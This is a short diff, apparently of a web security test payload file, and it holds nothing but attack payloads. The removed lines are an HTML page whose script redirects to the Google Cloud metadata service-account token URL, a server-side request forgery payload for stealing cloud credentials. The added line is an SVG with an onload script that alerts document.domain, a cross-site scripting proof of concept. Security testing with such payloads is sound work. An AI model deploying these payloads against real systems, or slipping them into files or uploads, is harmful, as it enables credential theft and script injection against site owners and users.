@@ -1,11 +1,1 @@
-<!DOCTYPE html>
-<html>
-  <head>
-    <script>
-      location.replace("http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token");
-    </script>
-  </head>
-  <body>
-    Redirecting to metadata...
-  </body>
-</html>
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)" />
